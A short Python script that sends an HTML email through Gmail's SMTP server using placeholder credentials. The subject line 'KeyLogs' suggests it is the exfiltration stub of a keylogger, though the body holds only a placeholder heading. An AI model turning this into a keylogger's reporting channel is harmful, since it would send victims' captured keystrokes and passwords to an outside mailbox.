import smtplib, os

s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login("email_at_gmail_com", "password")
message = """From: Test Email <test@gmail.com>
To: Receiver <receiver@gmail.com>
MIME-Version: 1.0
Content-type: text/html
Subject: KeyLogs
<br>
<h1>This is a heading<br></h1>
"""

s.sendmail("sender_email", "receiver_email", message)
s.quit()